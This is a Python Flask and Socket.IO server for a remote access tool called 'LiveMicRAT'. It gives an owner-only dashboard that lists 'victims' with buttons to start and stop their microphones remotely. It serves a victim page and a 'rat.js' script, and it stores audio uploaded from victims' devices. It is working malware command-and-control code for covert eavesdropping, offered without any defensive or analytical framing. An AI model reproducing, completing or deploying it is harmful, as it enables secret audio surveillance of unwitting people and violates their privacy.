import os
from flask import Flask, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
import config

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('OWNER_KEY', config.OWNER_KEY)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')

victims = {}
os.makedirs('audio', exist_ok=True)
port = int(os.environ.get('PORT', 5000))

def owner_required(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.args.get('key') or request.headers.get('X-Owner-Key')
        if key != app.config['SECRET_KEY']:
            return "<h1 style='color:red'>❌ Unauthorized Access</h1>", 403
        return f(*args, **kwargs)
    return decorated

@app.route('/')
@owner_required
def dashboard():
    return '''
<!DOCTYPE html>
<html>
<head>
<title>🎤 LiveMicRAT Secure Dashboard</title>
<style>
body{background:linear-gradient(45deg,#000,#111);color:#0f0;font-family:'Courier New',monospace;padding:30px;max-width:1200px;margin:auto;}
.header{background:rgba(0,255,0,0.1);padding:20px;border-radius:15px;border-left:5px solid #0f0;}
.victim{background:#1a1a1a;padding:25px;margin:15px 0;border-radius:15px;border:1px solid #333;box-shadow:0 5px 15px rgba(0,255,0,0.1);}
h3{margin:0 0 15px 0;color:#0f0;}
button{padding:15px 30px;font-size:16px;font-weight:bold;border:none;border-radius:10px;cursor:pointer;margin:10px 5px;transition:all 0.3s;}
.mic-on{background:#0f0;color:#000;box-shadow:0 0 20px #0f0;}
.mic-off{background:#f44;color:#fff;box-shadow:0 0 20px #f44;}
audio{width:100%;max-width:600px;margin:15px 0;border-radius:10px;}
.status{padding:10px;background:rgba(0,255,0,0.2);border-radius:10px;font-size:14px;}
</style>
</head>
<body>
<div class="header">
<h1>🎤 LiveMicRAT Control Panel</h1>
<p><strong>🔑 Owner Verified</strong> | Server: ''' + config.SERVER_ID + ''' | <span id="victim-count">0</span> Online</p>
</div>
<hr style="border:1px solid #0f0;">
<div id="victims"></div>

<script>
const ws = new WebSocket("wss://"+location.host+"/ws?key=''' + request.args.get('key') + '''");
const victims = {};

ws.onmessage = (e) => {
    try {
        const data = JSON.parse(e.data);
        if(data.type==="register"){
            victims[data.id] = {active:false};
            updateUI();
        } else if(data.type==="heartbeat"){
            if(victims[data.id]) victims[data.id].online = true;
        }
    } catch(e){}
};

function updateUI(){
    const count = Object.keys(victims).length;
    document.getElementById('victim-count').textContent = count;
    
    document.getElementById('victims').innerHTML = 
        Object.entries(victims).map(([id,v]) => `
            <div class="victim">
                <h3>📱 Victim ID: <code>${id}</code></h3>
                <button class="${v.active ? 'mic-on' : 'mic-off'}" 
                        onclick="toggleMic('${id}')">
                    ${v.active ? '🛑 STOP LIVE MIC' : '▶️ START LIVE MIC'}
                </button>
                <br>
                <audio id="audio_${id}" controls 
                       style="display:${v.active ? 'block' : 'none'};">
                </audio>
                <div class="status">
                    Status: ${v.active ? '🔴 LIVE STREAMING' : '⚪ Waiting'} 
                    ${v.online ? '🟢 Online' : '🔴 Offline'}
                </div>
            </div>
        `).join('') || '<p style="text-align:center;color:#666">No victims yet...</p>';
}

function toggleMic(id){
    const action = victims[id].active ? 'stop' : 'start';
    ws.send(JSON.stringify({type:'control', target:id, action:action}));
    victims[id].active = !victims[id].active;
    updateUI();
}

// Auto refresh
setInterval(updateUI, 3000);
updateUI();
</script>
</body></html>
'''

@app.route('/index.html')
def victim_page():
    return send_from_directory('.', 'index.html')

@app.route('/rat.js')
def rat_script():
    return send_from_directory('.', 'rat.js')

@app.route('/audio', methods=['POST'])
def save_audio():
    victim_id = request.form.get('id', 'unknown')
    if audio_file := request.files.get('audio'):
        os.makedirs('audio', exist_ok=True)
        filename = f"audio/{victim_id}_{len(os.listdir('audio')):04d}.webm"
        audio_file.save(filename)
        print(f"🎵 LIVE from {victim_id}: {filename}")
    return 'OK'

@socketio.on('connect')
def connect():
    if request.args.get('key') != app.config['SECRET_KEY']:
        raise ConnectionRefusedError('Unauthorized')

@socketio.on('register')
def register(data):
    victims[data['id']] = {'active': False, 'online': True}
    emit('registered', data)
    print(f"✅ Victim registered: {data['id']}")

@socketio.on('heartbeat')
def heartbeat(data):
    if data['id'] in victims:
        victims[data['id']]['online'] = True

@socketio.on('control')
def control_mic(data):
    emit('mic_command', data)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=port)
